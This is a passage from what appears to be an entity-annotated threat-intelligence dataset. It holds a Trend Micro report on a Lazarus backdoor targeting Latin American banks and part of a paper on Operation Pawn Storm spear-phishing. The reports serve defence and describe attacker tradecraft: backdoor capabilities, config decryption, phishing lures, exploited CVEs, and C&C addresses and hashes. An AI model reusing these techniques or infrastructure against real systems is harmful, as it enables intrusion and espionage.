fa92487e8a95cb2eea8;0701cc7eb1af616294e90cbb35c99fa2b29d2aada9fcbdcdaf578b3fcf9b56c7;27f5df1d35744cf283702fce384ce8cfb2f240bae5d725335ca1b90d6128bd40;13e761f459c87c921dfb985cbc6489060eb86b4200c4dd99692d6936de8df5ba;2481fd08abac0bfefe8d8b1fa3beb70f8f9424a1601aa08e195c0c14e1547c27;118.25.97[.]43;mails.daveengineer[.]com;powersafetraining[.]net;https://www.dropbox[.]com:443/s/ddgifm4ityqwx60/Cert.pem?dl=1;HKEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\2;HKEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\3;HKEY_LOCAL_MACHINE\SYSTEM\Setup\PrintResponsor\4;HKEY_LOCAL_MACHINE\HARDWARE\{2DB80286-1784-48b5-A751-
B6ED1F490303};HKEY_LOCAL_MACHINE\HARDWARE\{804423C2-F490-4ac3-BFA5-
13DEDE63A71A};HKEY LOCAL MACHINE\HARDWARE\{A5124AF5 DF23 49bf B0ED R i t;HKEY_LOCAL_MACHINE\HARDWARE\{A5124AF5-DF23-49bf-B0ED-
A18ED3DEA027};G:\FlowCloud\trunk\Dev\src\fcClient\Release\QQSetupEx_func.pdb;g:\FlowCloud\trunk\Dev\src\fcClient\Release\fcClientDll.pdb;F:\FlowCloud\trunk\Dev\src\fcClient\kmspy\Driver\Release\Driver.pdb;F:\FlowCloud\trunk\Dev\src\fcClient\kmspy\Driver\x64\Release\Driver.pdb",Michael Raggi;Dennis Schwarz;Georgi Mladenov,LookBack;FlowCloud,SharpSploit,,,,,,,49,5,3,20,38,4,13,102,3,95,1,0,0,0,0,0,0
LazarusContinuesHeistsMountAttacksOnFinancialOrganizationsInLatinAmerica,"<THREAT_ACTOR>Lazarus</THREAT_ACTOR> Continues Heists, Mounts Attacks on Financial Organizations in <COUNTRY>Latin America</COUNTRY>


Trend Micro <TIMESTAMP>November 20, 2018</TIMESTAMP>

<THREAT_ACTOR>Lazarus</THREAT_ACTOR> Continues Heists, Mounts Attacks on Financial
Organizations in <COUNTRY>Latin America</COUNTRY>

blog.trendmicro.com/trendlabs-security-intelligence/lazarus-continues-heists-mounts-attacks-on-financial-
organizations-in-latin-america/

Home   »   Malware   »   <THREAT_ACTOR>Lazarus</THREAT_ACTOR> Continues Heists, Mounts Attacks on Financial
Organizations in <COUNTRY>Latin America</COUNTRY>

0
by <IDENTITY>Lenart Bermejo</IDENTITY> and <IDENTITY>Joelson Soares</IDENTITY>

The cybercriminal group <THREAT_ACTOR>Lazarus</THREAT_ACTOR>, and particularly its
subgroup <THREAT_ACTOR>Bluenoroff</THREAT_ACTOR>, has a history of attacking financial
organizations in <COUNTRY>Asia</COUNTRY> and <COUNTRY>Latin America</COUNTRY>. There seems to
be a resurgence of activity from the group, and recent
events show how their tools and techniques have
evolved. Just <TIMESTAMP>last week</TIMESTAMP> they were found stealing millions
from ATMs across <COUNTRY>Asia</COUNTRY> and <COUNTRY>Africa</COUNTRY>. We also recently
discovered that they successfully planted their backdoor
(detected by <SOFTWARE>Trend Micro</SOFTWARE> as <MALWARE>BKDR_BINLODR.ZNFJ-A</MALWARE>) into
several machines of financial institutions across <COUNTRY>Latin America</COUNTRY>.

We determined that these backdoors were installed on the targets’ machines on <TIMESTAMP>September 19 2018</TIMESTAMP>, based mainly on the service creation time of the loader component. We also saw
that the attack technique bears some resemblance to a previous <TIMESTAMP>2017</TIMESTAMP> <THREAT_ACTOR>Lazarus</THREAT_ACTOR> attack,
analyzed by <ORG>BAE Systems</ORG>, against targets in <COUNTRY>Asia</COUNTRY>. The use of <IOC>FileTokenBroker.dll</IOC> was a key
part of the group’s attack in <TIMESTAMP>2017</TIMESTAMP>, and they seem to have used the same modularized
backdoor in the recent incident as well.

Our analysis of the backdoors used in the <TIMESTAMP>September 2018</TIMESTAMP> attacks show that
<IOC>AuditCred.dll</IOC>/<IOC>ROptimizer.dll</IOC> was similarly used:

<IOC>FileTokenBroker.dll</IOC>  (<TIMESTAMP>2017</TIMESTAMP> attack)

<IOC>AuditCred.dll</IOC>/<IOC>Roptimizer.dll</IOC>  (<TIMESTAMP>2018</TIMESTAMP> attack)

Launch Method Service Service

Function Loader Component Loader Component

Working directory %Windows%\System32 %Windows%\System32

Loaded Component Path %Windows%\System32\en-US %Program Files%\Common Files\System
\ado

Loaded Component
Blending

Blends with .mui files Blend with <SOFTWARE>ActiveX</SOFTWARE> data Object dll files

Table1: Similarities of the Loader components in both incidents

1/5

https://blog.trendmicro.com/trendlabs-security-intelligence/lazarus-continues-heists-mounts-attacks-on-financial-organizations-in-latin-america/
https://blog.trendmicro.com/trendlabs-security-intelligence/
https://blog.trendmicro.com/trendlabs-security-intelligence/category/malware/
https://blog.trendmicro.com/trendlabs-security-intelligence/lazarus-continues-heists-mounts-attacks-on-financial-organizations-in-latin-america/#respond
https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/a-look-into-the-lazarus-groups-operations
https://www.theverge.com/2018/11/8/18075124/north-korea-lazarus-atm-fastcash-hack-millions-dollars-stolen
https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/bkdr_binlodr.znfj-a
https://baesystemsai.blogspot.com/2017/10/taiwan-heist-lazarus-tools.html
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/11/lazaruslatinamerica2.png
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/11/lazaruslatinamerica3.png
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/11/lazaruslatinamerica4.png
https://blog.trendmicro.com/trendlabs-security-intelligence/files/2018/11/lazaruslatinamerica5.png


Analysis of backdoors used in <TIMESTAMP>2018</TIMESTAMP>

The <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group used a series of backdoors in their <TIMESTAMP>2018</TIMESTAMP> attacks, employing a
complicated technique that involves three major components:

AuditCred.dll/ROptimizer.dll (detected by <SOFTWARE>Trend Micro</SOFTWARE> as <MALWARE>BKDR_BINLODR.ZNFJ-A</MALWARE>) –
loader DLL that is launched as a service
<IOC>Msadoz<n>.dll</IOC> (detected by <SOFTWARE>Trend Micro</SOFTWARE> as <MALWARE>BKDR64_BINLODR.ZNFJ-A</MALWARE>) – encrypted
backdoor
n = number of characters in the loader dll’s filename
<IOC>Auditcred.dll.mui</IOC>/<IOC>rOptimizer.dll.mui</IOC> (detected by <SOFTWARE>Trend Micro</SOFTWARE> as
<MALWARE>TROJ_BINLODRCONF.ZNFJ-A</MALWARE>) – encrypted configuration file

Figure 1: Loading sequence of the modularized backdoor

The loader DLL is installed as a service and uses different names (AuditCred and
ROptimizer) on different machines. However, they still have the same capabilities and are
essentially the same file. Its purpose is to load <IOC>Msadoz<n>.dll</IOC> in order to decrypt and
execute it in memory.

Figure 2: AuditCred/ROptimizer Service

If successfully installed, this particular
backdoor poses quite a threat to its target.
It is capable of the following functions:

Collect file/folder/drive information
Download files and additional
malware
Launch/terminate/enumerate
process
Update configuration data
Delete files
Inject code from files to other
running process
Utilize proxy

2/5



Open reverse shell
Run in passive mode — instead of actively connecting to the command and control
(C&C) server, the backdoor will open and listen to a port then receive commands
through it

Once the backdoor is loaded, it will then load the encrypted configuration file
<IOC>Auditcred.dll.mui</IOC>/<IOC>rOptimizer.dll.mui</IOC> to extract the C&C information and connect to it. The
connection is necessary for conducting activities; and based on the backdoor’s functions,
these actions could be quite damaging to targets.

Figure 3: The first step of decryption will perform XOR on one byte using the previous
adjacent byte, starting from the last byte and excluding the first byte

Figure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step
as the RC4 key

3/5



Figure 5: Encrypted (Top) and decrypted (bottom) configuration file

It is also important to note that while the loader component and the configuration file are
located in the same directory (%windows%\system32), the encrypted backdoor is located
in a different directory (%Program Files%\Common Files\System\ado). This complex setup
makes it harder to detect and remove all the backdoors, and is more effective at hiding any
activities.

The complexity and the capabilities of these backdoors present a tough problem for the
targeted organizations. It is a sophisticated attack that needs equally sophisticated
security solutions.

<ORG>Trend Micro</ORG> Solutions

The <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group is an experienced organization, methodically evolving their tools and
experimenting with strategies to get past an organization’s defenses. The backdoors they
are deploying are difficult to detect and a significant threat to the privacy and security of
enterprises, allowing attackers to steal information, delete files, install malware, and more.

These and other tools used by the <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group can be mitigated by routinely scanning
the network for any malicious activity to help prevent the malware from entering and
spreading through an organization. In addition, educating employees and other key people
in an organization on social engineering techniques can allow them to identify what to look
out for when it comes to malicious attacks.

Other mitigation strategies include a multilayered approach to securing the organization’s
perimeter, which includes hardening the endpoints and employing application control to
help prevent malicious applications and processes from being executed.

4/5

https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/keep-an-eye-out-for-these-social-engineering-scams
http://blog.trendmicro.com/ensuring-comprehensive-endpoint-security/
https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint/endpoint-application-control.html


<ORG>Trend Micro</ORG> endpoint solutions such as <SOFTWARE>Trend Micro™ Smart Protection</SOFTWARE> Suites and Worry-
Free™ Business Security can protect users and businesses from these threats by detecting
malicious files and spammed messages as well as blocking all related malicious URLs.
<SOFTWARE>Trend Micro Deep Discovery</SOFTWARE>™ has an email inspection layer that can protect enterprises by
detecting malicious attachments and URLs that could lead to malicious downloads.

<SOFTWARE>Trend Micro XGen™</SOFTWARE> security provides a cross-generational blend of threat defense
techniques to protect systems from all types of threats. It features high-fidelity machine
learning on gateways and endpoints, and protects physical, virtual, and cloud workloads.
With capabilities like web/URL filtering, behavioral analysis, and custom sandboxing, <SOFTWARE>XGen</SOFTWARE>
security protects against today’s threats that bypass traditional controls; exploit known,
unknown, or undisclosed vulnerabilities; either steal or encrypt personally identifiable data;
or conduct malicious cryptocurrency mining. Smart, optimized, and connected, <SOFTWARE>XGen</SOFTWARE>
security powers <ORG>Trend Micro</ORG>’s suite of security solutions: <SOFTWARE>Hybrid Cloud Security</SOFTWARE>,
<SOFTWARE>User Protection</SOFTWARE>, and <SOFTWARE>Network Defense</SOFTWARE>.

Indicators of Compromise

Command and Control Servers
<IOC>107[.]172[.]195[.]20</IOC>
<IOC>192[.]3[.]12[.]154</IOC>
<IOC>46[.]21[.]147[.]161</IOC>

5/5

http://www.trendmicro.com/us/business/complete-user-protection/index.html
http://www.trendmicro.com/us/small-business/product-security/
http://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/
https://www.trendmicro.com/en_us/business/products/all-solutions.html
https://www.trendmicro.com/vinfo/us/security/definition/machine-learning
http://www.trendmicro.com/us/business/complete-user-protection/index.html
http://www.trendmicro.com/us/enterprise/product-security/vulnerability-protection/
https://www.trendmicro.com/en_us/business/products/hybrid-cloud/deep-security-for-cloud.html
https://www.trendmicro.com/en_us/business/products/user-protection.html
https://www.trendmicro.com/en_us/business/products/network.html

	<THREAT_ACTOR>Lazarus</THREAT_ACTOR> Continues Heists, Mounts Attacks on Financial Organizations in <COUNTRY>Latin America</COUNTRY>",Lazarus;Bluenoroff,Trend Micro;XGen;ActiveX;Trend Micro™ Smart Protection;Trend Micro Deep Discovery;Trend Micro XGen™;Hybrid Cloud Security;User Protection;Network Defense,,Trend Micro;BAE Systems,"2017;2018;November 20, 2018;last week;September 19 2018;September 2018",BKDR_BINLODR.ZNFJ-A;BKDR64_BINLODR.ZNFJ-A;TROJ_BINLODRCONF.ZNFJ-A,Latin America;Asia;Africa,FileTokenBroker.dll;AuditCred.dll;Msadoz.dll;Auditcred.dll.mui;rOptimizer.dll.mui;ROptimizer.dll;Roptimizer.dll;107[.]172[.]195[.]20;192[.]3[.]12[.]154;46[.]21[.]147[.]161,Lenart Bermejo;Joelson Soares,,,,,,,,,10,13,0,4,10,4,10,15,2,0,0,0,0,0,0,0,0
wp-operation-pawn-storm,"Operation<CAMPAIGN>Pawn Storm</CAMPAIGN>: Using Decoys to Evade Detection


A <ORG>Trend Micro</ORG> Research Paper

Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>
Using Decoys to Evade Detection

<IDENTITY>Loucif Kharouni</IDENTITY>
<IDENTITY>Feike Hacquebord</IDENTITY>
<IDENTITY>Numaan Huq</IDENTITY>
<IDENTITY>Jim Gogolinski</IDENTITY>
<IDENTITY>Fernando Mercês</IDENTITY>
<IDENTITY>Alfred Remorin</IDENTITY>
<IDENTITY>Douglas Otis</IDENTITY>
Forward-Looking Threat Research Team



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

<ORG>Trend Micro</ORG> LEGAL DISCLAIMER

The information provided herein is for general information and educational purposes only. It is not intended and should not be construed to constitute legal advice. 
The information contained herein may not be applicable to all situations and may not reflect the most current situation. Nothing contained herein should be relied on 
or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise. Trend 
Micro reserves the right to modify the contents of this document at any time without prior notice.

Translations of any material into other languages are intended solely as a convenience. Translation accuracy is not guaranteed nor implied. If any questions arise 
related to the accuracy of a translation, please refer to the original language official version of the document. Any discrepancies or differences created in the 
translation are not binding and have no legal effect for compliance or enforcement purposes.

Although <ORG>Trend Micro</ORG> uses reasonable efforts to include accurate and up-to-date information herein, <ORG>Trend Micro</ORG> makes no warranties or representations of any kind 
as to its accuracy, currency, or completeness. You agree that access to and use of and reliance on this document and the content thereof is at your own risk. Trend 
Micro disclaims all warranties of any kind, express or implied. Neither <ORG>Trend Micro</ORG> nor any party involved in creating, producing, or delivering this document shall 
be liable for any consequence, loss, or damage, including direct, indirect, special, consequential, loss of business profits, or special damages, whatsoever arising 
out of access to, use of, or inability to use, or in connection with the use of this document, or any errors or omissions in the content thereof. Use of this information 
constitutes acceptance for use in an “as is” condition.

CONTENTS

Introduction ....................................................................................................................................1

Ties That Bind the Operation <CAMPAIGN>Pawn Storm</CAMPAIGN> Attacks Together .........................................................2

<THREAT_ACTOR>SEDNIT</THREAT_ACTOR>....................................................................................................................................2

Attack Timeline ........................................................................................................................2

Attack Details ...........................................................................................................................4

Attack Evolution .......................................................................................................................5

Next-Level Phishing Targets ..................................................................................................11

Case 1: <ORG>Ministry of Defense</ORG>, <COUNTRY>Hungary</COUNTRY> .............................................................................11

Case 2: <ORG>OSCE</ORG></OSCE>, <COUNTRY>Austria</COUNTRY> ....................................................................................................13

Case 3: SAIC, <COUNTRY>United States</COUNTRY> ...........................................................................................13

Case 4: Academi ..............................................................................................................13

Other Webmail Services ........................................................................................................14

Conclusion ...................................................................................................................................16

References ..................................................................................................................................17



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

1

INTRODUCTION

Operation <CAMPAIGN>Pawn Storm</CAMPAIGN> refers to economic 
and political espionage attacks instigated by 
a group of threat actors primarily targeting 
<INDUSTRY>military</INDUSTRY>,<INDUSTRY>embassy</INDUSTRY>, and defense contractor 
personnel from the <COUNTRY>United States</COUNTRY> and its 
allies. Opposing factions to and dissidents 
of the <ORG>Russian government</ORG>, international 
media, and even the national security 
department of a <COUNTRY>U.S.</COUNTRY> ally were also targeted. 
The threat actors used three attack vectors―
spear-phishing emails with malicious 
attachments, an advanced network of 
phishing websites, and exploits injected into 
legitimate conference and media websites. 
They used a nonmalicious <SOFTWARE>JavaScript</SOFTWARE> to 
victimize <SOFTWARE>Microsoft™ Outlook® Web Access</SOFTWARE> 
(<SOFTWARE>OWA</SOFTWARE>) users from carefully selected target 
organizations. The <SOFTWARE>OWA</SOFTWARE> phishing attacks 
proved extremely effective and could be 

particularly dangerous to any organization 
that allows employees to use <SOFTWARE>OWA</SOFTWARE>.

An in-depth look at six multistage attacks 
revealed one thing in common―the use of 
<THREAT_ACTOR>SEDNIT</THREAT_ACTOR><THREAT_ACTOR>Sofacy</THREAT_ACTOR> malware [1], [2]. The use 
of such multistage downloaders provided 
attackers additional protection against 
detection. We believe the threat actors aimed 
to confuse their targets’ IT administrators 
by making it hard for them to string attack 
components together, thus evading detection.

This research paper details when certain 
attacks occurred, what tools were used in 
attempts to get in to target networks, and 
target profiles to form a general picture of 
Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>.



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

2

TIES THAT BIND THE OPERATION <CAMPAIGN>PAWN
STORM</CAMPAIGN> ATTACKS TOGETHER

<THREAT_ACTOR>SEDNIT</THREAT_ACTOR>

<THREAT_ACTOR>SEDNIT</THREAT_ACTOR> malware are mostly backdoors [3], [4] 
and information stealers [5] that log affected 
users’ keystrokes, steal system information, 
and send stolen information to remote 
command-and-control (C&C) servers.

Analyses of the <THREAT_ACTOR>SEDNIT</THREAT_ACTOR> infectors that arrived 
as email attachments in the attacks featured 
in this paper revealed six distinct chains [see 
diagram on page 3].

Attack Timeline

The investigation focused on a group of 
attacks that has been dubbed “Operation 
<CAMPAIGN>Pawn Storm</CAMPAIGN>” [6] due to the attackers’ use of 
two or more connected tools/tactics to attack 
a specific target similar to the chess strategy 
it was named after. This paper illustrates how 
the <CAMPAIGN>Pawn Storm</CAMPAIGN> attacks were carried out with 
the aid of five spear-phishing emails, which 
used contextually relevant subjects to get 
specific targets from different countries to 
open weaponized attachments designed to 
compromise their systems.

 
Timeline of spear-phishing emails sent to specific targets

The attackers sent emails to potential victims, 
including military, embassy, and defense 
contractor personnel. The following emails 
were among those that were found related to 
this operation:

• An email sent to a potential victim 
from the <ORG>Ministry of Defense</ORG> in <COUNTRY>France</COUNTRY> 
had an exploit for <CVE>CVE-2010-3333</CVE> 
[7] disguised as a document named 

“<IOC>International Military.rtf</IOC>.” <ORG>Trend Micro</ORG> 
received a sample of this on <TIMESTAMP>October 
17, 2011</TIMESTAMP> and has been detecting it as 
<MALWARE>TROJ_ARTIEF.AP</MALWARE> [8] since then.

• An email sent to a potential victim 
working from the <ORG>Vatican Embassy</ORG> 
in <COUNTRY>Iraq</COUNTRY> used reports of a bombing 
incident [9] that occurred on <TIMESTAMP>January 
9, 2012</TIMESTAMP> as social engineering lure. 



3

<ORG>Trend Micro</ORG> |Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>


<THREAT_ACTOR>SEDNIT</THREAT_ACTOR> infectors attached to targeted attack campaign emails

Sent a day after the incident, 
the email had a <SOFTWARE>Microsoft 
Word®</SOFTWARE> file attachment named 
“<IOC>IDF_Spokesperson_Terror_
Attack_011012.doc</IOC>,” which 
exploited <CVE>CVE-2012-0158</CVE> [10].

 
Sample email sent to recipients from the 

<ORG>Vatican Embassy</ORG> in <COUNTRY>Iraq</COUNTRY>

 
Exploit for <CVE>CVE-2012-0158</CVE> disguised as a 

Word (.DOC) file


<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

4

• An email sent on <TIMESTAMP>September 20, 
2013</TIMESTAMP> to military officials from several 
countries used the then-upcoming 
“Asia-Pacific Economic Cooperation 
(APEC) <COUNTRY>Indonesia</COUNTRY> 2013” conference 
as bait. The email had two <SOFTWARE>Microsoft 
Excel®</SOFTWARE> file attachments named 
“<IOC>APEC Media list 2013 Part1.xls</IOC>,” 
which exploited <CVE>CVE-2012-0158</CVE>, and 
“<IOC>APEC Media list 2013 Part2.xls</IOC>,” 
which was nonmalicious.

 
Sample email sent to military officials across 
countries using the “APEC <COUNTRY>Indonesia</COUNTRY> 2013” 

conference as bait

 
Exploit for <CVE>CVE-2012-0158</CVE> disguised as an <SOFTWARE>Excel</SOFTWARE> 

(.XLS) file (<IOC>APEC Media list 2013 Part1.xls</IOC>)

• An email sent to Pakistani military 
officials on <TIMESTAMP>January 23, 2014</TIMESTAMP> used the 
“Homeland Security Summit Middle 
East” [11] conference as bait. It had a 
Word file attachment named “<IOC>Details.
doc</IOC>,” which exploited <CVE>CVE-2012-
0158</CVE>.

 
Sample email sent to military officials from 

Pakistan using the “Homeland Security Summit 
Middle East” conference as bait

• An email sent to <ORG>Polish government</ORG> 
employees [12] on <TIMESTAMP>August 11, 2014</TIMESTAMP> 
had a MIME HTML (.MHT) file 
attachment named “<IOC>MH17.doc</IOC>,” which 
exploited <CVE>CVE-2012-0158</CVE>.

 
Exploit for <CVE>CVE-2012-0158</CVE> disguised as a MIME 

HTML (.MHT) file

Attack Details

All of the observed Operation <CAMPAIGN>Pawn Storm</CAMPAIGN> 
attacks comprised several stages. Each 
attack had at least two phases:

• In phase 1, opening the email 
attachment displays a decoy 
document while the exploit runs in 
the background. The exploit drops 
a downloader component (.DLL file) 
named “<IOC>netids.dll</IOC>,” “<IOC>netidt.dll</IOC>,” or 
“<IOC>coreshell.dll</IOC>.”



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

5

• In phase 2, the downloader 
component communicates with a C&C 
server and downloads a dropper that 
ultimately installs a keylogger. After 

capturing information from infected 
systems, the keylogger sends data 
back to the C&C server.

 
Phases 1 and 2 in an Operation <CAMPAIGN>Pawn Storm</CAMPAIGN> attack

We only managed to collect latter-
stage payloads for two out of the six 
aforementioned attacks. The C&C servers 
tied to the other four attacks refused to serve 
the rest of the files to complete the attack 
chains.

Multistage attacks are a double-edged sword. 
If one link in the attack chain, aside from 
the end node, is detected and removed in 
the initial infection stage, the entire attack 
fails. On the other hand, having several 
links in the attack chain makes detecting the 
final component more difficult. Tracing the 
previous and next links is also difficult when 
any of the components is inspected on its 
own outside the attack chain.

Although some of the C&C servers were still 
alive at the time of investigation, they did not 
respond to our infected systems. Repeated 
attempts to trick the C&C servers into serving 
the next files in the incomplete attack chains 
failed. The attacks they were tied to could be 
time sensitive and it is possible that they no 
longer hosted the files for succeeding stages.

Attack Evolution

Even though the filenames used for different 
components remained fairly consistent from 
2010 to the present, earlier attacks were 
more elaborate and complex compared with 
those seen this year. The 2014 attacks we 
have seen were more streamlined.



<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

6

 
Comparison of an Operation <CAMPAIGN>Pawn Storm</CAMPAIGN> attack in 2011 and another in 2014

Although variations in past and current 
attack chains exist, both are still being 
used by threat actors to date to ensure one 

thing—detection evasion. The following table 
compares and contrasts the six Operation 
<CAMPAIGN>Pawn Storm</CAMPAIGN> attacks in greater detail.



7

<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

Operation <CAMPAIGN>Pawn Storm</CAMPAIGN> Attack Comparison

Case 1 Case 2 Case 3 [13] Case 4 Case 5 Case 6

Unknown exploit, 
possibly disguised 
as a .PDF, .DOC, 
or .RTF file, carries 
the top-level dropper 
(<IOC>dropper.exe</IOC>; SHA-
1: <IOC>72cfd996957bde0 
6a02b0adb2d66d8a 
a9c25bf37</IOC>)

.RTF file exploits 
<CVE>CVE-2010-3333</CVE> 
(SHA-1: <IOC>956d1a360 
55c903cb570890da 
69deabaacb5a18a</IOC>) 
and drops <IOC>saver.scr</IOC> 
(SHA-1: <IOC>e8b55d9aeff124df4008b0d372bf2f2d3e5e5ae7</IOC>)

Unknown 
exploit carries a 
dropper (<IOC>Dropper 
DLL</IOC>; SHA-1: 
<IOC>9c622b39521183dd71ed2a174031ca159beb6479</IOC>)

Two .XLS files come 
with spear-phishing 
emails:

• First file (<IOC>APEC Media list 2013 Part1.xls</IOC>; SHA-
1: <IOC>a90921c182cb90807102ef402719ee8060910345</IOC>) exploits 
<CVE>CVE-2012-0158</CVE>

• Second file 
(<IOC>APEC Media list 2013 Part2.xls</IOC>; SHA-1: <IOC>b3098f99db1f80e27aec0c9a5a625aedaab5899a</IOC>) 
is a decoy document

.RTF file (SHA-1: 
<IOC>78d28072fdabf0b5aac5e8f337dc768d07b63e1e</IOC>) exploits 
<CVE>CVE-2012-0158</CVE> 
and drops <IOC>saver.scr</IOC> 
(SHA-1: <IOC>7FBB5A2E46FACD3EE0C945F324414210C2199FFB</IOC>) into <Local Settings>\Temp\

.MHT file drops:
• <IOC>MH17.doc</IOC> 

(SHA-1: <IOC>DAE7FAA1725DB8192AD711D759B13F8195A18821</IOC>), 
a decoy 
document, 
into <Local Settings>\Temp\

• W.q (SHA-1: <IOC>8D 
EF0A554F1913 
4A5DB3D2AE9 
49F9500CE3D 
D2CE</IOC>), a 
dropper, 
into <Local 
Settings>\Temp\



8

<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

Operation <CAMPAIGN>Pawn Storm</CAMPAIGN> Attack Comparison

Case 1 Case 2 Case 3 [13] Case 4 Case 5 Case 6

Dropper.exe drops:
• Decoy file 

(<IOC>Letter to IAEA.
pdf</IOC>; SHA-1: <IOC>6ad 
a11c71a5176a8 
2a8898680ed1e 
aa4e79b9bc3</IOC>) 
into <Local 
Settings>\Temp\

• Downloader 
(<IOC>netids.dll</IOC>; SHA-
1: <IOC>c5ce5b7d10a 
ccb04a4e45c3a 
4dcf10d16b192 
e2f</IOC>) into <Local 
Settings>\
Application 
Data\

Saver.scr drops:
• Decoy 

document 
(<IOC>Military 
Cooperation.
doc</IOC>; SHA-1: <IOC>0E 
12C8AB9B89B6 
EB6BAF16C4B 
3BBF9530067 
963F</IOC>) into 
<Local 
Settings>\Temp\

• Skype.exe 
(SHA-1: <IOC>550AB 
D71650BAEA05 
A0071C4E084A 
803CB413C31</IOC>), 
a <THREAT_ACTOR>SEDNIT</THREAT_ACTOR>
variant, 
into <Local 
Settings>\Temp\

• <IOC>Cryptmodule.
exe</IOC> (SHA-1: <IOC>4B 
8806FE8E0CB4 
9E4AA5D8F877 
66415A2DB1E9 
A9</IOC>) into 
<AppData>\
Microsoft\Crypt\

Dropper DLL drops 
<IOC>netids.dll</IOC> (SHA-1: <IOC>dd 
61530076152dae56 
8b4834b1899212c9 
6c1a02</IOC>) into 
<Local Settings>\
Application Data\

<IOC>APEC Media list 
2013 Part1.xls</IOC> drops 
dw20.t (SHA-1: <IOC>ac6b 
465a13370f87cf579 
29b7cfd1e45c36945 
85</IOC>), a .DLL file

Saver.scr drops:
• IDF_

<IOC>Spokesperson_
Targeted_
Attack_101012.
doc</IOC> (SHA-1: <IOC>F5 
42C5F9259274 
D94360013D14 
FFBECC43AAE 
552</IOC>), a decoy 
document, 
into <Local 
Settings>\Temp\

• <IOC>Install.exe</IOC> 
(SHA-1: <IOC>BC58A 
8550C53689C8 
148B021C917F 
B4AEEC62AC</IOC> 
1) into <Local 
Settings>\Temp\

W.q drops:
• <IOC>Coreshell.dll</IOC> 

(SHA-1: <IOC>A85513 
97E1F1A2C014 
8E6EADCB56F 
A35EE6009CA</IOC>) 
into <Program 
Files>\Common 
Files\System\

• <IOC>Tmp64.dat</IOC>, 
a copy of 
coreshell.dll, 
into <Program 
Files>\Common 
Files\System\



9

<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

Operation <CAMPAIGN>Pawn Storm</CAMPAIGN> Attack Comparison

Case 1 Case 2 Case 3 [13] Case 4 Case 5 Case 6

<IOC>Netids.dll</IOC> 
communicates 
with a C&C server 
(<IOC>200.106.145.122</IOC>)

• Military 
Cooperation.
doc has been 
encoded 
using Cyrillic 
characters and 
opens in Word

• Skype.exe 
drops:
• Downloader 

(netids.dll; 
SHA-1: <IOC>6b87 
5661a74c46 
73ae6ee89a 
cc5cb6927ca 
5fd0d</IOC>), a 
<THREAT_ACTOR>SEDNIT</THREAT_ACTOR> 
variant, into 
<Windows>\
system32\

• Copy of 
netids.dll 
(mscsv.
tmp) into 
<Windows>\
system32\

• <IOC>Cryptmodule.
exe</IOC> drops s.vbs 
(actually a 
.PE and not a 
.VBS file) and 
communicates 
with a C&C 
server (windous.
kz)

Netids.dll downloads 
and saves msmvs.
exe (SHA-1: <IOC>88f7e27 
1e54c127912db4db 
49e37d93aea8a49c 
9</IOC>) in <Local 
Settings>\Temp\

<IOC>Dw20.t</IOC> drops netids.
dll (SHA-1: <IOC>3814eec 
8c45fc4313a9c7f65c 
e882a7899cf0405</IOC>)

Install.exe drops 
netids.dll (SHA-1: <IOC>14 
BEEB0FC5C8C887 
D0435009730B6370 
BF94BC93</IOC>) into 
<Windows>\
system32\

<IOC>Coreshell.dll</IOC> 
downloads conhost.
dll (SHA-1: <IOC>B49FAD 
3E5E6787E96373A 
C37ED58083F7572 
D72A</IOC>), a dropper, 
from a C&C server



10

<ORG>Trend Micro</ORG> | Operation <CAMPAIGN>Pawn Storm</CAMPAIGN>

Operation <CAMPAIGN>Pawn Storm</CAMPAIGN> Attack Comparison

Case 1 Case 2 Case 3 [13] Case 4 Case 5 Case 6

C&C server 
confirms receipt of 
communication from 
infected systems 
then stops further 
interactions

• <IOC>Netids.dll</IOC> 
communicates 
with a C&C 
server 
(<IOC>70.85.221.20</IOC>)

• <IOC>S.vbs</IOC> (SHA-1: <IOC>0 
A3E6607D5E9 
C59C712106C3 
55962B11DA29 
02FC</IOC>) runs 
CreateFile C:\\
DOCUME~1\\
ADMINI~1\\
LOCALS~1\\
Temp\\update.
exe but does 
nothing else

<IOC>Msmvs.exe</IOC> drops 
conhost.dll (SHA-1: 
<IOC>55318328511961EC 
339DFDDCA044306 
8DCCE9CD2</IOC>) into 
<Local Settings>\
Temp\

<IOC>Netids.dll</IOC> 
communicates 
with a C&C server 
(<IOC>70.85.221.10,</IOC>)

<IOC>Netids.dll</IOC> 
communicates 
with a C&C server 
(<IOC>70.85.221.10</IOC>)

<IOC>Conhost.dll</IOC> drops 
<IOC>advstoreshell.dll</IOC> 
(SHA-1: <IOC>E338A57C3 
5A4732BBB5F738E 
2387C1671A002BC 
B</IOC>), a keylogger

<IOC>Conhost.dll</IOC> drops 
<IOC>netui.dll</IOC> (SHA-1: 
<IOC>5A452E7248A8D37 
45EF53CF2B1F3D7 
D8479546B9</IOC>), 
